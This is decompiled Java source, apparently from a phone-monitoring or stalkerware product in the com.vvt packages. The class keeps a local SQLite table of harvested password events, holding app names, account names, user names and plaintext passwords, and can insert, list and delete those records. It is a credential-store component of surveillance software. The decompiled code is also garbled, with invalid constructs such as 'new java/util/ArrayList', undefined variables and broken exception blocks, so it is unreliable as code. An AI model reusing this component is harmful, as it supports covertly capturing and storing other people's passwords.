package com.vvt.eventrepository.a;

import android.content.ContentValues;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteDatabaseCorruptException;
import com.vvt.base.FxEvent;
import com.vvt.base.FxEventType;
import com.vvt.eventrepository.a;
import com.vvt.eventrepository.querycriteria.QueryOrder;
import com.vvt.events.FxAppType;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxPasswordEvent;
import com.vvt.exceptions.database.FxDbCorruptException;
import com.vvt.exceptions.database.FxDbOperationException;
import java.util.ArrayList;
import java.util.List;

public class ad
  extends o
{
  private static final boolean a = a.a;
  private SQLiteDatabase b;
  
  public ad(SQLiteDatabase paramSQLiteDatabase)
  {
    this.b = paramSQLiteDatabase;
  }
  
  private List b(QueryOrder paramQueryOrder, int paramInt)
  {
    boolean bool1 = false;
    Cursor localCursor = null;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject2 = "password";
    Object localObject3 = n.a(paramQueryOrder);
    String str2 = Integer.toString(paramInt);
    int i = 0;
    String str3 = null;
    try
    {
      SQLiteDatabase localSQLiteDatabase = this.b;
      localCursor = n.a(localSQLiteDatabase, (String)localObject2, null, (String)localObject3, str2);
      if (localCursor != null) {
        for (;;)
        {
          boolean bool2 = localCursor.moveToNext();
          if (!bool2) {
            break;
          }
          localObject2 = new com/vvt/events/FxPasswordEvent;
          ((FxPasswordEvent)localObject2).<init>();
          localObject3 = "_id";
          int j = localCursor.getColumnIndex((String)localObject3);
          long l1 = localCursor.getLong(j);
          str3 = "time";
          i = localCursor.getColumnIndex(str3);
          long l2 = localCursor.getLong(i);
          String str4 = "app_id";
          int k = localCursor.getColumnIndex(str4);
          str4 = localCursor.getString(k);
          String str5 = "app_name";
          int m = localCursor.getColumnIndex(str5);
          str5 = localCursor.getString(m);
          String str6 = "app_type";
          int n = localCursor.getColumnIndex(str6);
          n = localCursor.getInt(n);
          String str7 = "account_name";
          int i1 = localCursor.getColumnIndex(str7);
          str7 = localCursor.getString(i1);
          String str8 = "user_name";
          int i2 = localCursor.getColumnIndex(str8);
          str8 = localCursor.getString(i2);
          String str9 = "password";
          int i3 = localCursor.getColumnIndex(str9);
          str9 = localCursor.getString(i3);
          ((FxPasswordEvent)localObject2).setEventId(l1);
          ((FxPasswordEvent)localObject2).setEventTime(l2);
          ((FxPasswordEvent)localObject2).setAppId(str4);
          ((FxPasswordEvent)localObject2).setAppName(str5);
          localObject3 = FxAppType.forValue(n);
          ((FxPasswordEvent)localObject2).setAppType((FxAppType)localObject3);
          ((FxPasswordEvent)localObject2).setAccountName(str7);
          ((FxPasswordEvent)localObject2).setUserName(str8);
          ((FxPasswordEvent)localObject2).setPassword(str9);
          localArrayList.add(localObject2);
        }
      }
      String str1;
      if (localCursor == null) {
        break label449;
      }
    }
    catch (SQLiteDatabaseCorruptException localSQLiteDatabaseCorruptException)
    {
      try
      {
        localObject2 = new com/vvt/exceptions/database/FxDbCorruptException;
        str1 = localSQLiteDatabaseCorruptException.getMessage();
        ((FxDbCorruptException)localObject2).<init>(str1);
        throw ((Throwable)localObject2);
      }
      finally
      {
        if (localCursor != null) {
          localCursor.close();
        }
      }
    }
    finally
    {
      localObject2 = new com/vvt/exceptions/database/FxDbOperationException;
      localObject3 = localThrowable.getMessage();
      ((FxDbOperationException)localObject2).<init>((String)localObject3, localThrowable);
    }
    localCursor.close();
    label449:
    bool1 = a;
    if (bool1) {}
    return localThrowable;
  }
  
  public long a(FxEvent paramFxEvent)
  {
    paramFxEvent = (FxPasswordEvent)paramFxEvent;
    ContentValues localContentValues = new android/content/ContentValues;
    localContentValues.<init>();
    long l1 = paramFxEvent.getEventTime();
    Object localObject2 = Long.valueOf(l1);
    localContentValues.put("time", (Long)localObject2);
    localObject2 = paramFxEvent.getAppId();
    localContentValues.put("app_id", (String)localObject2);
    localObject2 = paramFxEvent.getAppName();
    localContentValues.put("app_name", (String)localObject2);
    int i = paramFxEvent.getAppType().getValue();
    localObject2 = Integer.valueOf(i);
    localContentValues.put("app_type", (Integer)localObject2);
    localObject2 = paramFxEvent.getAccountName();
    localContentValues.put("account_name", (String)localObject2);
    localObject2 = paramFxEvent.getUserName();
    localContentValues.put("user_name", (String)localObject2);
    Object localObject3 = "password";
    localObject2 = paramFxEvent.getPassword();
    localContentValues.put((String)localObject3, (String)localObject2);
    try
    {
      localObject3 = this.b;
      ((SQLiteDatabase)localObject3).beginTransaction();
      localObject3 = this.b;
      localObject2 = "password";
      FxEventType localFxEventType = null;
      long l2 = ((SQLiteDatabase)localObject3).insert((String)localObject2, null, localContentValues);
      l1 = 0L;
      boolean bool = l2 < l1;
      if (bool)
      {
        localObject2 = this.b;
        localFxEventType = FxEventType.PASSWORD;
        FxEventDirection localFxEventDirection = FxEventDirection.UNKNOWN;
        n.a((SQLiteDatabase)localObject2, l2, localFxEventType, localFxEventDirection);
      }
      localObject2 = this.b;
      ((SQLiteDatabase)localObject2).setTransactionSuccessful();
      this.b.endTransaction();
      return l2;
    }
    catch (SQLiteDatabaseCorruptException localSQLiteDatabaseCorruptException)
    {
      try
      {
        localObject3 = new com/vvt/exceptions/database/FxDbCorruptException;
        String str = localSQLiteDatabaseCorruptException.getMessage();
        ((FxDbCorruptException)localObject3).<init>(str);
        throw ((Throwable)localObject3);
      }
      finally
      {
        this.b.endTransaction();
      }
    }
    finally
    {
      localObject3 = new com/vvt/exceptions/database/FxDbOperationException;
      localObject2 = localThrowable.getMessage();
      ((FxDbOperationException)localObject3).<init>((String)localObject2, localThrowable);
    }
  }
  
  public List a(QueryOrder paramQueryOrder, int paramInt)
  {
    new ArrayList();
    return b(paramQueryOrder, paramInt);
  }
  
  public void a()
  {
    Object localObject;
    try
    {
      SQLiteDatabase localSQLiteDatabase = this.b;
      localObject = "password";
      str2 = null;
      localSQLiteDatabase.delete((String)localObject, null, null);
      return;
    }
    catch (SQLiteDatabaseCorruptException localSQLiteDatabaseCorruptException)
    {
      localObject = new com/vvt/exceptions/database/FxDbCorruptException;
      String str1 = localSQLiteDatabaseCorruptException.getMessage();
      ((FxDbCorruptException)localObject).<init>(str1);
      throw ((Throwable)localObject);
    }
    finally
    {
      localObject = new com/vvt/exceptions/database/FxDbOperationException;
      String str2 = localThrowable.getMessage();
      ((FxDbOperationException)localObject).<init>(str2, localThrowable);
    }
  }
  
  public int b(long paramLong)
  {
    Object localObject2;
    try
    {
      Object localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject2 = "_id=";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject1 = ((StringBuilder)localObject1).append(paramLong);
      localObject1 = ((StringBuilder)localObject1).toString();
      localObject2 = this.b;
      str2 = "password";
      return ((SQLiteDatabase)localObject2).delete(str2, (String)localObject1, null);
    }
    catch (SQLiteDatabaseCorruptException localSQLiteDatabaseCorruptException)
    {
      localObject2 = new com/vvt/exceptions/database/FxDbCorruptException;
      String str1 = localSQLiteDatabaseCorruptException.getMessage();
      ((FxDbCorruptException)localObject2).<init>(str1);
      throw ((Throwable)localObject2);
    }
    finally
    {
      localObject2 = new com/vvt/exceptions/database/FxDbOperationException;
      String str2 = localThrowable.getMessage();
      ((FxDbOperationException)localObject2).<init>(str2, localThrowable);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/eventrepository/a/ad.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */